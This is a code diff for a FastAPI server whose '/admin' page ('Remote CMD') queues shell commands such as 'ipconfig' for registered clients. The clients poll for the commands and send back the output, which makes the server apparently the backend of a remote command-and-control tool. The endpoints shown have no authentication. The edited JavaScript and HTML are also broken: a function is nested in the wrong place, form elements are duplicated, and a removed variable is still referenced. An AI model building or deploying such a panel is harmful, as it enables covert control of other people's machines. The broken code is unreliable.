@@ -6,6 +6,7 @@ from fastapi.templating import Jinja2Templates
 from starlette.requests import Request
 import shutil
 import os
+from collections import defaultdict
 import uuid
 from typing import Dict
 
@@ -37,9 +38,12 @@ async def upload_image(client_id: str = Query(...), file: UploadFile = File(...)
 
 
 
+registered_clients = set()
+
 @app.get("/register")
-async def register_client():
+async def register():
     client_id = str(uuid.uuid4())
+    registered_clients.add(client_id)
     return {"client_id": client_id}
 
 
@@ -65,74 +69,70 @@ async def get_gallery(request: Request):
     )
     return templates.TemplateResponse("gallery.html", {"request": request, "images": images})
 
-current_command = ""
-last_output = ""
+commands = defaultdict(str)
+outputs = defaultdict(str)
 
 @app.post("/set-command")
-async def set_command(client_id: str = Form(...), command: str = Form(...)):
-    clients_commands[client_id] = command
+async def set_command(client_id: str = Query(...), command: str = Form(...)):
+    commands[client_id] = command
     return {"status": "ok"}
 
-@app.get("/command/{client_id}")
-async def get_command(client_id: str):
-    cmd = clients_commands.pop(client_id, "")
-    return {"command": cmd}
-
+@app.get("/command")
+async def get_command(client_id: str = Query(...)):
+    cmd = commands[client_id]
+    commands[client_id] = ""
+    return cmd
 
 @app.post("/command-result")
-async def receive_result(client_id: str = Form(...), output: str = Form(...)):
-    clients_outputs[client_id] = output
+async def receive_result(client_id: str = Query(...), output: str = Form(...)):
+    outputs[client_id] = output
     return {"status": "received"}
 
-@app.get("/command-result/{client_id}")
-async def get_result(client_id: str):
-    return {"output": clients_outputs.get(client_id, "")}
-
-
+@app.get("/command-result")
+async def get_result(client_id: str = Query(...)):
+    return {"output": outputs.get(client_id, "")}
 # --------------------------
 # ✅ INTERFACCIA /admin
 # --------------------------
 @app.get("/admin", response_class=HTMLResponse)
 async def admin_page():
-    client_list = list(clients_outputs.keys())
-    client_options = "".join([f"<option value='{c}'>{c}</option>" for c in client_list])
-    image_status = "ON" if enable_image_upload else "OFF"
-
+    client_list_html = "".join([f'<option value="{cid}">{cid}</option>' for cid in registered_clients])
     return f"""
     <html>
     <head>
-        <title>Admin Panel</title>
-        <style>
-            body {{ font-family: monospace; background: #111; color: #eee; padding: 2rem; }}
-            select, input, textarea, button {{ width: 100%; margin-top: 1rem; background: #222; color: #0f0; border: none; padding: 0.5rem; font-family: monospace; }}
-        </style>
+        <title>Remote CMD</title>
         <script>
             async function sendCommand() {{
-                const clientId = document.getElementById('client').value;
                 const cmd = document.getElementById('command').value;
-                await fetch('/set-command', {{
+                const clientId = document.getElementById('client').value;
+                await fetch('/set-command?client_id=' + encodeURIComponent(clientId), {{
                     method: 'POST',
                     headers: {{ 'Content-Type': 'application/x-www-form-urlencoded' }},
-                    body: 'client_id=' + encodeURIComponent(clientId) + '&command=' + encodeURIComponent(cmd)
+                    body: 'command=' + encodeURIComponent(cmd)
                 }});
                 document.getElementById('output').value = "In attesa di risposta...";
                 setTimeout(() => fetchOutput(clientId), 5000);
             }}
 
             async function fetchOutput(clientId) {{
-                const res = await fetch('/command-result/' + clientId);
+                const res = await fetch('/command-result?client_id=' + encodeURIComponent(clientId));
                 const json = await res.json();
-                document.getElementById('output').value = json.output;
-            }}
-
+                document.getElementById('output').value = json.output || '(nessun output)';
             async function toggleUpload() {{
                 const res = await fetch('/toggle-upload');
                 location.reload();
             }}
+            }}
         </script>
     </head>
-    <body>
-        <h2>Admin - Client Command Panel</h2>
+    <body style="background:#111; color:#fff; font-family:monospace;">
+        <h3>Seleziona client:</h3>
+        <select id="client">{client_list_html}</select>
+        <br><br>
+        <input type="text" id="command" placeholder="Inserisci comando" />
+        <button onclick="sendCommand()">Invia</button>
+        <textarea id="output" rows="20" cols="80"></textarea>
+    
         <label>Client:</label>
         <select id="client">{client_options}</select>
         <input type="text" id="command" placeholder="es: ipconfig" />
